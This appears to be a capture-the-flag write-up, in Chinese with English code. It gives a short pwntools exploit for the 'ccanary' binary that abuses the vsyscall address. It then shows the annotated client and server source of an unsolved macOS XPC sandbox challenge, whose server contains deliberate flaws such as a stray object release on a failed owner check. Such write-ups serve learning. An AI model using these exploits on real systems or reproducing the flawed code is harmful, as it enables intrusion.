## Pwn

### ccanary

```
// file
ccanary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, not stripped

// checksec
$ checksec ./ccanary
[*] '/Users/u1f383/v8_env/docker_vol/canary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



exploit:

```python
#!/usr/bin/python3

from pwn import *
import sys

BIN = './ccanary'
IP = ''
PORT = 0

if len(sys.argv) > 1:
    r = remote(IP, PORT)
else:
    r = process(BIN)

input()
r.sendlineafter('quote> ', b'\xaa'*0x1f + p64(0xffffffffff600000))
r.interactive()
```



### share sandbox (unsolve)

[XPC official document](https://developer.apple.com/documentation/xpc/xpc_connections)

> The XPC Services API provides a lightweight mechanism for basic interprocess communication at the `libSystem` level. It allows you to create lightweight helper tools, called *XPC services*, that perform work on behalf of your app



範例輸出：

```c
Enter the path to your exploit: ./test
Ensuring exploit is readable for user nobody
Creating sandbox profiles...
Starting client
Starting exploit
[i] Using service: com.alles.sandbox_share
[+] Connected to: com.alles.sandbox_share
[+] Event handler registered!
Sending...
<connection: 0x7fa7204059d0> { name = com.alles.sandbox_share, listener = false, pid = 0, euid = 4294967295, egid = 4294967295, asid = 4294967295 }
<dictionary: 0x7fa720504600> { count = 2, transaction: 0, voucher = 0x0, contents =
        "op" => <uint64: 0x104f>: 1
        "task" => <mach send right: 0x7fa720504690> { name = 515, right = send, urefs = 3 }
}
reply: 
<dictionary: 0x7fa7207041c0> { count = 2, transaction: 0, voucher = 0x0, contents =
        "status" => <int64: 0x5f>: 0
        "client_id" => <string: 0x7fa7207043b0> { length = 8, contents = "57314371" }
}
[+] Got client_id: 57314371
[+] Stats uploaded to index: 24

---------- split with client ----------
[i] Using service: com.alles.sandbox_share
[+] Connected to: com.alles.sandbox_share
[+] Event handler registered!
Sending...
<connection: 0x7f9f554059d0> { name = com.alles.sandbox_share, listener = false, pid = 0, euid = 4294967295, egid = 4294967295, asid = 4294967295 }
<dictionary: 0x7f9f55504600> { count = 2, transaction: 0, voucher = 0x0, contents =
        "op" => <uint64: 0x104f>: 1
        "task" => <mach send right: 0x7f9f55504690> { name = 515, right = send, urefs = 3 }
}
reply: 
<dictionary: 0x7f9f557041c0> { count = 2, transaction: 0, voucher = 0x0, contents =
        "status" => <int64: 0x5f>: 0
        "client_id" => <string: 0x7f9f557043b0> { length = 8, contents = "fddf6e5b" }
}
[*] entry_id: 25
[+] Got client_id: fddf6e5b
```

五種功能：

- `register_client()` - 一開始必須跟 XPC server 註冊

  ```cpp
  int register_client(task_port_t task_port) {
  	xpc_object_t message, reply;
      message = xpc_dictionary_create(NULL, NULL, 0); // 建立一個 directory object
      xpc_dictionary_set_uint64(message, "op", 1); // 1 == Register new client
      xpc_dictionary_set_mach_send(message, "task", task_port); // 傳入 thread port
      reply = xpc_connection_send_message_with_reply_sync(connection, message);
      char *result = xpc_dictionary_get_string(reply, "client_id");
      client_id = calloc(1, 9);
      strncpy(client_id, result, 9);
      return 0; // client_id was updated
  }
  ```

- `create_entry()` - 建立一個新的 object

  ```c
  uint64_t create_entry(xpc_object_t object, uint64_t token_index, char *UIDs) {
  	xpc_object_t message, reply;
  
      message = xpc_dictionary_create(NULL, NULL, 0); // 建立一個新的 directory
      xpc_dictionary_set_uint64(message, "op", 2);
      xpc_dictionary_set_string(message, "client_id", client_id);
      xpc_dictionary_set_value(message, "data", object); // our data
      xpc_dictionary_set_string(message, "UIDs", UIDs);
      xpc_dictionary_set_uint64(message, "token_index", token_index);
      reply = xpc_connection_send_message_with_reply_sync(connection, message);
      return xpc_dictionary_get_uint64(reply, "index");
  }
  ```

- `get_entry()` - 取得對應 index 的 data

  ```c
  xpc_object_t get_entry(uint64_t index) {
  	xpc_object_t message, reply;
  
      message = xpc_dictionary_create(NULL, NULL, 0);
      xpc_dictionary_set_uint64(message, "op", 3);
      xpc_dictionary_set_string(message, "client_id", client_id);
      xpc_dictionary_set_uint64(message, "index", index); // index
      reply = xpc_connection_send_message_with_reply_sync(connection, message);
      return xpc_dictionary_get_value(reply, "data");
  }
  ```

- `delete_entry()` - 刪除對應 index 的 data

  ```c
  int delete_entry(uint64_t index) {
  	xpc_object_t message, reply;
  
      message = xpc_dictionary_create(NULL, NULL, 0);
      xpc_dictionary_set_uint64(message, "op", 4);
      xpc_dictionary_set_string(message, "client_id", client_id);
      xpc_dictionary_set_uint64(message, "index", index);
      reply = xpc_connection_send_message_with_reply_sync(connection, message);
      return 0;
  }
  ```

- `upload_data()` - 將自己的 `task_events_info` 作為 data 上傳上去，這個部分頗怪，不確定他的行為

  ```c
  uint64_t upload_data() {
      mach_msg_type_number_t info_out_cnt = TASK_EVENTS_INFO_COUNT;
      task_events_info_data_t task_events_info = {0};
      kern_return_t kr = -1;
      xpc_object_t data;
      kr = task_info(mach_task_self_, TASK_EVENTS_INFO, &task_events_info, &info_out_cnt);
      data = xpc_data_create(&task_events_info, sizeof(task_events_info_data_t));
      return create_entry(data, 1, "0");
  }
  ```

- 資料要用 directory 的方式包裝，也就是 `xpc_dictionary_create(NULL, NULL, 0)`

- client 端看起來沒什麼問題



Server 端的 source code：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>

#include <xpc/xpc.h>
#include <mach/mach.h>
#include <dispatch/dispatch.h>
#include <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>

extern void xpc_dictionary_set_mach_send(xpc_object_t dictionary,
                                        const char* name,
                                        mach_port_t port);
// get mach ports from xpc objects
extern mach_port_t xpc_mach_send_get_right(xpc_object_t value);

// ------------------ types ------------------
typedef struct {
    uint32_t token_index;
    uint32_t owner;
    uint32_t *allowed_uids;
    xpc_object_t object;
} client_entry_t;

// ------------------ globals ------------------
#define MAX_UIDS        8
#define TABLE_SIZE      10000
#define LOG             1
#define DEBUG           1
// #define SERVICE_NAME    "com.alles.sandbox_share"

char *service_name = NULL;
FILE *output = NULL;
client_entry_t **entry_table = NULL;
xpc_object_t registered_clients = NULL;

// ------------------ mach stuff ------------------
kern_return_t _xpc_mach_port_retain_send(mach_port_name_t name){
  return mach_port_mod_refs(mach_task_self(), name, MACH_PORT_RIGHT_SEND, 1);
}

// ------------------ helpers ------------------
#define log(msg...)    fprintf(output, msg);fflush(output);
#define brk()           __asm__("brk");

// Parses up to max_size comma-seperated unsigned ints into
// an int array and pads with zeros
uint32_t *parse_uids(char *str, size_t max_size) {
    uint32_t *uids = (uint32_t *)calloc(max_size, sizeof(uint32_t));
    int i = 0;

    char *end = str;
    while(*end) {
        if (i == max_size) break;

        uint32_t n = strtoul(str, &end, 10);
        uids[i] = n;  i++;

        while (*end == ',') {
            end++;
        }
        str = end;
    }

    return uids;
}

// Apple's Endpoint Security framework allows processes to query 
// security-relevant information about clients through audit tokens.
// This token is essentially just an array of unsigned ints
// containing stuff from the kernels cred structure for the process
// e.g. EUID in audit_token->val[1], PID in audit_token->val[5], 
// pidversion in audit_token->val[7], ...
// 
// We can use this to filter clients and only allow specific, pids, uids or sandboxes
// to access entries.
/*	audit_token.val[0] = my_cred->cr_audit.as_aia_p->ai_auid;
	audit_token.val[1] = my_pcred->cr_uid;
	audit_token.val[2] = my_pcred->cr_gid;
	audit_token.val[3] = my_pcred->cr_ruid;
	audit_token.val[4] = my_pcred->cr_rgid;
	audit_token.val[5] = p->p_pid;
	audit_token.val[6] = my_cred->cr_audit.as_aia_p->ai_asid;
	audit_token.val[7] = p->p_idversion; */
int get_audit_token_value(xpc_object_t xpc_task, uint32_t token_index) {
    mach_msg_type_number_t task_info_out_cnt = 8;
    audit_token_t *audit_token;

    if(token_index >= TASK_AUDIT_TOKEN /* 15 */) {
        log("[-] Index out of bounds!");
        return -1;
    }

    audit_token = (audit_token_t *) calloc(1, sizeof(audit_token_t));
    task_port_t task = xpc_mach_send_get_right(xpc_task);
    if(task != MACH_PORT_NULL) {
        kern_return_t kr = task_info(task, TASK_AUDIT_TOKEN, audit_token, &task_info_out_cnt);
        if(kr != KERN_SUCCESS) {
            log("[-] Failed to get task info! \nError (%d): %s\n", kr, mach_error_string(kr));
            return -1;
        }
        return audit_token->val[token_index];
    }
    return -1;
}

int get_entry(char *client_id, uint64_t index, xpc_object_t *out_entry, uint64_t *owner) {
    client_entry_t *entry = entry_table[index];
    if(entry == NULL) {
        return -1;
    }

    xpc_object_t xpc_task = xpc_dictionary_get_value(registered_clients, client_id);
    uint32_t our_value = get_audit_token_value(xpc_task, entry->token_index);
    int found = 0;
    for (int i = 0; i < MAX_UIDS; i++) {
        if (our_value == entry->allowed_uids[i]) {
            *out_entry = entry->object;
            *owner = entry->owner;
            return 0;
        }
    }

    return -2;
}

// ------------------ XPC code ------------------
void handle_message(xpc_connection_t conn, xpc_object_t message) {
    uint64_t status = -1;
    char *client_id = calloc(1, 10);

    xpc_connection_t remote = xpc_dictionary_get_remote_connection(message);
    // create 要回傳給 client 的 reply object
    xpc_object_t reply = xpc_dictionary_create_reply(message);

    uint64_t op = xpc_dictionary_get_uint64(message, "op");
    if (op == 1) {
        // Register new client
        xpc_object_t xpc_task = xpc_dictionary_get_value(message, "task");
        if(!registered_clients) {
            // XPC object that represents a dictionary of XPC objects keyed to C-strings.
            registered_clients = xpc_dictionary_create(NULL, NULL, 0);
        }
        // we generate a random client ID and save the task port 
        // for auth stuff later on
        int client_id_int = arc4random();
        snprintf(client_id, 9, "%x", client_id_int);
        xpc_dictionary_set_value(registered_clients, client_id, xpc_task);
        xpc_dictionary_set_string(reply, "client_id", client_id);
        status = 0; // looks good
        goto send_reply;
    }
    client_id = xpc_dictionary_get_string(message, "client_id");

    switch (op) {
        case 2: {
            // Create a new entry
            client_entry_t *entry = calloc(1, sizeof(client_entry_t));

            char *uids = xpc_dictionary_get_string(message, "UIDs");
            xpc_object_t object = xpc_dictionary_get_value(message, "data");
            uint64_t token_index = xpc_dictionary_get_uint64(message, "token_index");
            xpc_object_t xpc_task = xpc_dictionary_get_value(registered_clients, client_id);
            uint32_t owner = get_audit_token_value(xpc_task, token_index);
            
            // thread 沒註冊
            if (owner == 0xffffffff) {
                xpc_dictionary_set_string(reply, "error", "Couldn't get owner UID");
                goto send_reply;                
            }

            uint64_t idx = 0;
            while (entry_table[idx] != 0) {
                idx += 1;
                if (idx >= TABLE_SIZE /* 10000 */) {
                    xpc_dictionary_set_string(reply, "error", "No more space");
                    goto send_reply;                
                }
            }
            entry->owner = owner;
            entry->token_index = token_index;
            entry->allowed_uids = parse_uids(uids, MAX_UIDS);
            entry->object = object;
            xpc_retain(entry->object); // increments the reference count of an object
            entry_table[idx] = entry;
            xpc_dictionary_set_uint64(reply, "index", idx); // reply["index"] = idx
            status = 0;
            break;
        }

        case 3: {
	        // Query stored entry
            uint64_t index = xpc_dictionary_get_uint64(message, "index");
            if (index >= TABLE_SIZE) {
                xpc_dictionary_set_string(reply, "error", "Provided index is out of bounds");
                goto send_reply;                
            }
            
            xpc_object_t data;
            uint64_t owner = 0;
            int kr = get_entry(client_id, index, &data, &owner);
            if (kr == 0) {
                xpc_dictionary_set_value(reply, "data", data);
                xpc_dictionary_set_uint64(reply, "owner", owner);
            } else if (kr == -1) {
                xpc_dictionary_set_string(reply, "error", "Entry empty");
                goto send_reply;              
            } else { /* -2 */
                xpc_dictionary_set_string(reply, "error", "Not authorized");
                goto send_reply;  
            }
            status = 0;
            break;
        }

        case 4: {
	        // Delete entry
            uint64_t index = xpc_dictionary_get_uint64(message, "index");
            if (index >= TABLE_SIZE) {
                xpc_dictionary_set_string(reply, "error", "Provided index is out of bounds");
                goto send_reply;                
            }

            client_entry_t *entry = entry_table[index];
            if(entry == NULL) {
                xpc_dictionary_set_string(reply, "error", "Entry empty");
                goto send_reply;                
            }

            xpc_object_t xpc_task = xpc_dictionary_get_value(registered_clients, client_id);
            uint32_t our_value = get_audit_token_value(xpc_task, entry->token_index);

            if(our_value != entry->owner) {
                xpc_release(entry->object);
                xpc_dictionary_set_string(reply, "error", "Not owner");
                goto send_reply;
            }

            free(entry->allowed_uids);
            xpc_release(entry->object);
            free(entry);
            entry_table[index] = NULL;
            status = 0;
            break;
        }
        default:
            xpc_dictionary_set_string(reply, "error", "Unknown operation");
    }

send_reply:
    // set status
	xpc_dictionary_set_int64(reply, "status", status);
	xpc_connection_send_message(remote, reply);
    xpc_release(reply);
}

void init_service(dispatch_queue_t queue) {
    xpc_connection_t conn;
    // create connection
    conn = xpc_connection_create_mach_service(service_name, queue, 1);
    log("[+] Registered %s\n", service_name);

    entry_table = (client_entry_t **)calloc(TABLE_SIZE, sizeof(client_entry_t *));
    log("[+] Entry table at 0x%llx\n", entry_table);

    // set event handler
	xpc_connection_set_event_handler(conn, ^(xpc_object_t client) {
        xpc_type_t type = xpc_get_type(client);
        if (type == XPC_TYPE_CONNECTION) {
            log("[i] Got connection!\n")
            xpc_connection_set_event_handler(client, ^(xpc_object_t object) {
                xpc_type_t type = xpc_get_type(object);
				// only handle dictionary
                if (type == XPC_TYPE_DICTIONARY) {
                    handle_message(client, object);
                }
            });
            xpc_connection_resume(client);
        }
    });
    xpc_connection_resume(conn);
}

int main(int argc, char *argv[]) {
	dispatch_queue_t queue;

    if(argc < 2) {
        puts("Missing argument!");
        printf("usage: %s <service name>\n", argv[0]);
        exit(-1);
    }

    service_name = argv[1];
    printf("[i] Using service: %s\n", service_name);

	output = fopen("/tmp/xa2nkf_daemon.log", "a+");
	if (!LOG || !output) {
		output = stderr;
	}

    queue = dispatch_queue_create("xpc daemon", 0);
    dispatch_set_target_queue(queue, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0));
    init_service(queue);
	dispatch_main(); // server XPC service
	return 0;
}
```
